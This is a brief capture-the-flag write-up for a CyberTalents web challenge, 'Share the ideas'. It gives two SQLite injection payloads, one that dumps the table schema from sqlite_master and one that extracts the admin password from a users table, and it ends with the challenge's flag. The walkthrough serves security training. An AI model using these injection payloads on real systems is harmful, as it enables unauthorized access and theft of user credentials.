## Challenage name: Share the ideas 
Link: https://cybertalents.com/challenges/web/share-ideas
## Solution:
1) Login with any credential, for me I logged in using test as username and noting for the password 
2) After logging in successfully
3) Let's try to do SQL injection:

![Error](https://user-images.githubusercontent.com/55226688/84436872-cb79e500-ac3c-11ea-8838-abf34f6bfc42.png)

4) 
` ' || (SELECT sql FROM sqlite_master));   ` 

this will retrun all the needed information of the table

![Error](https://user-images.githubusercontent.com/55226688/84437043-0ed45380-ac3d-11ea-9f0e-d11626b845d4.png)


5)
 `  ' || (SELECT password FROM xde43_users WHERE role=='admin' )); ` 
 
 Flag: flag245698
 
